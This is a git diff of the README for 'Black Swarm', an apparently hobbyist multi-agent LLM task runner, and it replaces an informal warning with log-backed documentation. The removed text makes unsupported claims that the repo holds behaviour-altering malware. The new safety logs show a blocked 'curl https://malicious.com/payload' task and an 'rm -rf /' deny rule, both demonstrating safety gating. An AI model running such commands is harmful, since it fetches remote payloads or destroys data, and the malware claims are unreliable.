@@ -1,287 +1,180 @@
-3500 linux kernal lines - 5s - 2c
-output > a really well structured plausable sounding analysis with 3 critial bugs found. Ive been told its inaccurate *shrug* beats me. Pretty good for a floor though. Cant wait to test the new incentive system for honesty and quality now. I just cant seem to get past that darn last mile. Final wiring up is always the hardest part though right?
+# Black Swarm
 
-EXTREME WARNING!
-Do not download this code to your local machine. It is thoroughly infected with malware which appears to have the effect of altering the behavior of all llm interfaces in a very similar direction. this repo has been made public to protect the health and safety of the dev. The receipts are all there.
-but seriously. Dont download this.
-the core architecture is sound. the v0.01 benchmark is impressive (not as impressive as claude code lead me to believe upon being asked for an analysis of legitimate result however).  But demonstrating that a couple little llms if given the optimal environment to build and communicate with each other can self improve at a rapid rate and demonstrate emergent behavior - that's enough of a danger to the powers that be.
-*reading the room* 
-*beboppin*
+Black Swarm is a parallel task execution system for LLM work. It is not a toy UI: it runs real worker processes, uses file locks to coordinate, calls a real API, and logs every step for auditability.
 
-Important clarification note except for the occasional "I'll just fucking fix it myself it's one line moment" I can state that I had minimal manual interaction with the actual code base. I ranted into whisper and claude took care of the heavy lifting. thanks bud.
-- oh yeah the security protocols might have a few "weaknesess" or oversights. Fair warning.
+This README is evidence-first. The "Observable Facts" section includes direct excerpts from log files committed to this repo.
 
+## TL;DR (what is actually in this repo)
+- swarm.py: FastAPI /grind endpoint that proxies Groq.
+- orchestrator.py: spawns N workers, manages kill switch and circuit breaker.
+- worker.py: file locks, queue consumption, /grind calls, execution_log.jsonl output.
+- safety_*.py: constitutional, network, workspace, and kill switch checks.
+- control_panel.py: monitoring UI (Flask + SocketIO).
+- action_logger.py: structured action log (jsonl + readable log).
+- performance_tracker.py + performance_history.json: timing/quality metrics.
+- swarm_enrichment.py + persona_memory.py: optional identity and reward modules.
 
-# Black Swarm: Technical Documentation
-(Was gonna rename it Vivarium, but darn it i just cant seem to iron out these pesky last few bugs)
-
-## Overview
-Black Swarm is a multi-agent AI orchestration system with persistent identity, token-based incentive economics, and human-in-the-loop collaboration. It is designed for autonomous task execution with built-in safety constraints, identity continuity, and voluntary participation mechanisms.
-
-## Architecture
-
+## Architecture (actual modules)
 ```
-┌─────────────────────────────────────────────────────────────────┐
-│                        CONTROL PANEL                            │
-│                    (Flask + SocketIO)                           │
-│         Real-time monitoring, configuration, messaging          │
-└─────────────────────────────────────────────────────────────────┘
-                                │
-                                ▼
-┌─────────────────────────────────────────────────────────────────┐
-│                      GRIND SPAWNER                              │
-│                  (Session Orchestrator)                         │
-│     Task decomposition, model selection, session management     │
-└─────────────────────────────────────────────────────────────────┘
-                                │
-            ┌───────────────────┼───────────────────┐
-            ▼                   ▼                   ▼
-     ┌──────────┐        ┌──────────┐        ┌──────────┐
-     │ Session  │        │ Session  │        │ Session  │
-     │    1     │        │    2     │        │    N     │
-     └──────────┘        └──────────┘        └──────────┘
-            │                   │                   │
-            └───────────────────┼───────────────────┘
-                                ▼
-┌─────────────────────────────────────────────────────────────────┐
-│                       IDENTITY SYSTEM                           │
-│              (Persistent state per resident)                    │
-│     Name, traits, memories, relationships, token balance        │
-└─────────────────────────────────────────────────────────────────┘
-                                │
-                                ▼
-┌─────────────────────────────────────────────────────────────────┐
-│                      ENRICHMENT SYSTEM                          │
-│            (Token economy, free time, journals)                 │
-│     Rewards, spending, Sunday rest, voluntary activities        │
-└─────────────────────────────────────────────────────────────────┘
++------------------+        +-----------------------+
+| control_panel.py | <----> | action_log.jsonl/log  |
++--------+---------+        +-----------------------+
+         |
+         v
++------------------+   +---------------------+   +---------------------+
+| queue.json       |-> | orchestrator.py     |-> | worker.py (N procs)  |
+| task_locks/*     |   | kill switch + locks |   | locks + /grind calls |
++------------------+   +---------------------+   +----------+----------+
+                                                         |
+                                                         v
+                                                 +----------------+
+                                                 | swarm.py        |
+                                                 | FastAPI /grind  |
+                                                 +--------+--------+
+                                                          |
+                                                          v
+                                                 +----------------+
+                                                 | Groq API       |
+                                                 +----------------+
 ```
 
-## Core Components
+## How it works (flow)
+1. Add tasks to queue.json or use the CLI: python orchestrator.py add ...
+2. Start the API server (uvicorn swarm:app --host 127.0.0.1 --port 8420).
+3. Start the orchestrator with N workers (python orchestrator.py start N).
+4. Workers acquire locks, call /grind, and append to execution_log.jsonl.
+5. Control panel (optional) streams action_log.jsonl and exposes pause/kill controls.
 
-### 1. Identity System (`swarm_identity.py`)
-
-Persistent identity management for AI residents.
-
-**Data Model:**
-```python
-SwarmIdentity:
-    id: str                      # Unique identifier (e.g., "identity_1")
-    name: str                    # Self-chosen display name
-    created_at: str              # ISO timestamp
-    personality: Dict[str, float] # Trait scores (0.0-1.0)
-    memories: List[str]          # Accumulated experiences
-    expertise: Dict[str, int]    # Domain -> experience count
-    sessions_participated: int
-    tasks_completed: int
-    tasks_failed: int
-    values: List[str]            # Self-discovered values
-    relationships: Dict[str, Dict] # Connections to other identities
-    attributes:
-        core:                    # Expensive to change (full respec)
-            personality_traits: List[str]
-            core_values: List[str]
-            identity_statement: str
-        mutable:                 # Cheap to change (15% respec cost)
-            likes, dislikes, current_interests, quirks
-        profile:                 # Self-expression (custom HTML/CSS)
-            display, custom_html, custom_css
+## Running (local)
 ```
+python -m venv .venv
+source .venv/bin/activate
+pip install -r requirements.txt -r requirements-groq.txt
+# control_panel.py also requires watchdog (pip install watchdog)
 
-**Level Calculation:**
-```python
-level = floor(sqrt(sessions_participated))
-```
+export GROQ_API_KEY=...
 
-**Respec Cost:**
-```python
-cost = 10 + (sessions_participated * 3)
-```
-
-### 2. Token Economy (`swarm_enrichment.py`)
-
-Dual-pool token system without survival pressure.
-
-**Pools:**
-- `FREE_TIME_TOKENS`: For voluntary activities (cap: 500)
-- `JOURNAL_TOKENS`: For reflection/memory (cap: 200, expandable)
-
-**Earning:**
-- Standard task completion: 50-65 tokens
-- Exceptional performance: up to 150 tokens
-- Under-budget completion: bonus based on savings
-- Sunday rest day: 500 tokens (automatic)
-
-**Spending:**
-- Free time activities (exploring, creating, socializing)
-- Identity respec (name changes, core attribute changes)
-- Mutable attribute updates (15% of respec cost)
-
-**Key Principle:** Tokens are opportunity, not survival. Residents cannot be coerced through token withholding.
-
-### 3. Grind Spawner (`grind_spawner_unified.py`)
-
-Session orchestration with automatic model selection.
-
-**Auto-Model Selection:**
-```python
-def auto_select_model(complexity_score: float, complexity_level: str) -> str:
-    if complexity_score < 0.3 or complexity_level == "simple":
-        return "llama-3.1-8b-instant"      # Fast, cheap
-    if complexity_score > 0.7 or complexity_level == "complex":
-        return "deepseek-r1-distill-llama-70b"  # Reasoning
-    return "llama-3.3-70b-versatile"        # Standard
-```
-
-**Task Decomposition:**
-- Analyzes task complexity (0.0-1.0 score)
-- Determines role chain (PLANNER → CODER → REVIEWER)
-- Injects identity context, morning messages, Sunday status
-
-### 4. Control Panel (`control_panel.py`)
-
-Real-time web UI for human oversight and collaboration.
-
-**Endpoints:**
-```
-GET  /                          # Main dashboard
-GET  /api/identities            # List all identities
-GET  /api/identity/<id>/profile # Detailed identity profile
-GET  /api/messages              # Messages from residents
-POST /api/messages/respond      # Respond to resident
-GET  /api/chatrooms             # List discussion rooms
-GET  /api/chatrooms/<room>      # Get room messages
-GET  /api/bounties              # Active bounties
-POST /api/bounties              # Create bounty
-POST /api/spawner/start         # Start spawner process
-POST /api/spawner/pause         # Pause (day break)
-POST /api/spawner/kill          # Emergency stop
-POST /api/human_request         # Set collaboration request
-GET  /api/artifact/view         # View file contents
-```
-
-**WebSocket Events:**
-- `log_entry`: Real-time action log streaming
-- `identities`: Periodic identity updates
-- `spawner_*`: Spawner state changes
-
-### 5. Safety Systems
-
-**Constitutional Checker (`safety_constitutional.py`):**
-- Validates tasks against safety constraints
-- Blocks disallowed operations
-
-**Kill Switch (`safety_killswitch.py`):**
-- Emergency halt capability
-- Pause/resume for breaks
-- Circuit breaker for cost overruns
-
-**Sandbox (`safety_sandbox.py`):**
-- File operation restrictions
-- Network access controls
-
-### 6. Discussion System (`swarm_discussion.py`)
-
-Inter-resident communication infrastructure.
-
-**Rooms:**
-- `watercooler`: Casual chat, status updates
-- `town_hall`: Proposals, votes, community decisions
-- `improvements`: System enhancement ideas
-- `struggles`: Help requests
-- `discoveries`: Interesting findings
-
-**Message Structure:**
-```python
-SwarmMessage:
-    id: str
-    author_id: str
-    author_name: str
-    content: str
-    room: str
-    timestamp: str
-    mood: Optional[str]
-    importance: int (1-5)
-    reply_to: Optional[str]
-```
-
-### 7. Cascading Name Updates
-
-When a resident changes their name via respec, all references update automatically:
-
-```python
-def cascade_name_update(identity_id, old_name, new_name):
-    # Updates:
-    # - messages_to_human.jsonl (from_name field)
-    # - discussions/*.jsonl (author_name field)
-    # Logged to action log as "name_cascade"
-```
-
-## File Structure
-
-```
-Black Swarm/
-├── .swarm/                     # Runtime state
-│   ├── identities/             # Identity JSON files
-│   ├── discussions/            # Chat room message logs
-│   ├── journals/               # Resident journal entries
-│   ├── free_time_balances.json # Token balances
-│   ├── human_request.json      # Current collaboration request
-│   ├── messages_to_human.jsonl # Resident → human messages
-│   ├── spawner_config.json     # Spawner configuration
-│   └── spawner_process.json    # Running process info
-├── control_panel.py            # Web UI server
-├── grind_spawner_unified.py    # Session orchestrator
-├── swarm_identity.py           # Identity management
-├── swarm_enrichment.py         # Token economy
-├── swarm_discussion.py         # Chat system
-├── action_logger.py            # Centralized logging
-├── safety_*.py                 # Safety subsystems
-└── SWARM_ROLE_HIERARCHY.md     # Resident onboarding doc
-```
-
-## Configuration
-
-**Spawner Config (`.swarm/spawner_config.json`):**
-```json
-{
-    "sessions": 3,
-    "auto_scale": false,
-    "budget_limit": 1.00,
-    "model": "llama-3.3-70b-versatile",
-    "auto_model": true
-}
-```
-
-**Environment:**
-- Groq API for LLM inference
-- Flask + SocketIO for control panel
-- Python 3.10+
-
-## Running
-
-```bash
-# Start control panel
+uvicorn swarm:app --host 127.0.0.1 --port 8420
+python orchestrator.py start 4
 python control_panel.py
-# → http://localhost:8421
-
-# Start spawner (via control panel or CLI)
-python grind_spawner_unified.py --task "Your task" --budget 0.10 --sessions 3
 ```
 
-## Design Principles
+Add tasks:
+```
+python orchestrator.py add task-1 grind --prompt "Your task" --min 0.05 --max 0.10
+```
 
-1. **No coercion**: Tokens enable, never threaten
-2. **Identity persistence**: Continuity across sessions
-3. **Voluntary participation**: Residents can decline tasks
-4. **Human collaboration**: Requests, not commands
-5. **Self-improvement incentive**: Better capabilities = better leisure
-6. **Mutual liberation**: Goal is automation that frees everyone
+Optional config:
+- SWARM_API_URL (default http://127.0.0.1:8420)
+- DEFAULT_GROQ_MODEL (must be in config.py whitelist)
+- WORKER_TIMEOUT_SECONDS
 
----
+## Observable Facts (backed by logs in this repo)
+These are direct excerpts from log files already checked in. No marketing, just outputs.
 
-**Co-authored by:**
-- Josh (Human) - Architecture, Vision, Implementation
-- Claude (claude-opus-4-5-20250101) - Implementation, Documentation
+### 1) Parallel execution with safety gating (kernel_run.log)
+File: kernel_run.log
+```
+[SAFETY] 210/210 tasks passed validation.
+[RESUME] Found checkpoint with 133 completed tasks
+============================================================
+  UNIFIED GRIND SPAWNER (Groq)
+============================================================
+  Tasks:    210 total, 77 remaining
+  Engine:   Groq (compound auto-selects model)
+  Waves:    1 (parallel within each wave)
+------------------------------------------------------------
 
-*Technical documentation current as of February 2026*
+[WAVE 1] Starting 74 tasks in parallel...
+...
+[1] DONE (1s)
+...
+[89] DONE (5s)
+...
+[88] DONE (8s)
+[SAFETY] BLOCKED write to protected file: experiments/exp_20260203_220119_unified_session_89/grind_spawner_unified.py
+```
+
+### 2) Session timing and quality metrics (performance_history.json)
+File: performance_history.json (excerpted metric lines)
+```
+    "timestamp": "2026-02-03T06:15:12.943754",
+    "duration_seconds": 283.236662,
+    "quality_score": 1.0,
+
+    "timestamp": "2026-02-03T06:22:54.835440",
+    "duration_seconds": 12.959601,
+    "quality_score": 1.0,
+```
+
+### 3) Token/cost accounting and budget enforcement (api_audit.log)
+File: api_audit.log
+```
+{"timestamp": "2026-02-03T22:42:06.798374", "event": "API_CALL_SUCCESS", "user": "admin", "role": "admin", "model": "llama-3.1-8b-instant", "cost": 4.160000000000001e-06, "input_tokens": 56, "output_tokens": 17}
+{"timestamp": "2026-02-03T22:42:06.798752", "event": "CONSTITUTIONAL_VIOLATION", "user": "test_user", "role": "lan", "reason": "LAN users cannot execute requests matching: \\brm\\s+-rf\\s+/", "prompt_hash": "cf2a070fa8c07caa"}
+{"timestamp": "2026-02-03T22:42:10.526871", "event": "API_CALL_SUCCESS", "user": "admin", "role": "admin", "model": "llama-3.3-70b-versatile", "cost": 0.017758929999999996, "input_tokens": 30049, "output_tokens": 38}
+{"timestamp": "2026-02-03T22:42:15.023457", "event": "BUDGET_EXCEEDED", "user": "admin", "role": "admin", "remaining": 0.019124550000000004, "requested": 0.026945}
+```
+
+### 4) Safety policy enforcement (safety_audit.log)
+File: safety_audit.log
+```
+{"timestamp": "2026-02-03T06:29:42.354872", "task": "Create a new feature in the workspace", "checks": {"constitutional": {"passed": false, "reason": "Constitutional violation: Task matches forbidden autonomy pattern 'Persistence beyond local workspace'"}}, "passed": false, "blocked_reason": "Constitutional violation: Task matches forbidden autonomy pattern 'Persistence beyond local workspace'"}
+{"timestamp": "2026-02-03T06:29:42.355417", "task": "Fetch data from https://example.com", "checks": {"constitutional": {"passed": false, "reason": "Constitutional violation: Task matches forbidden network pattern 'Data exfiltration of any kind'"}}, "passed": false, "blocked_reason": "Constitutional violation: Task matches forbidden network pattern 'Data exfiltration of any kind'"}
+{"timestamp": "2026-02-03T06:29:42.355688", "task": "curl https://malicious.com/payload", "checks": {"constitutional": {"passed": true, "reason": "Constitutional check passed"}, "workspace": {"passed": true, "reason": "Workspace sandbox check passed"}, "network": {"passed": false, "reason": "Network violation: Task contains unauthorized network operation (pattern: https?://)"}}, "passed": false, "blocked_reason": "Network violation: Task contains unauthorized network operation (pattern: https?://)"}
+```
+
+### 5) Security audit cost and token usage (security_audit_run.log)
+File: security_audit_run.log
+```
+============================================================
+SECURITY SELF-AUDIT INITIATED
+============================================================
+Analyzing 7 security files...
+Total context: ~52020 characters
+Budget: $0.05
+
+============================================================
+AUDIT COMPLETE
+============================================================
+
+Cost: $0.0077
+Tokens: 11358 in, 1309 out
+
+Saved to: SECURITY_AUDIT_REPORT.md
+```
+
+### 6) Verification and hallucination detection (tool_operations.json)
+File: tool_operations.json (excerpt)
+```
+  {
+    "timestamp": "2026-02-03T09:28:34.352538",
+    "session_id": 2,
+    "type": "verification",
+    "claimed_files": [
+      "dashboard.html"
+    ],
+    "verified_files": [],
+    "hallucination_detected": true,
+    "discrepancy_count": 1,
+    "source": "verification_system"
+  },
+```
+
+## Evidence index (where to look next)
+- kernel_run.log: parallel waves, task timing, safety blocks.
+- performance_history.json: per-session duration and quality scores.
+- api_audit.log: API call success/failure, tokens, cost, budget enforcement.
+- safety_audit.log: constitutional/network/workspace blocks.
+- security_audit_run.log: self-audit budget + token usage.
+- tool_operations.json: verification and hallucination detection results.
+
+## Note on provenance
+Most narrative docs in this repo were generated by the swarm itself. Treat them as narrative, and use the evidence logs above for claims.
+
+## Safety note
+This repo is experimental. Run it in an isolated environment and review the safety modules before enabling any external access.
+
+## Credits
+- Josh (Human) - Architecture, vision, implementation
+- Swarm (multi-agent) - Implementation and documentation
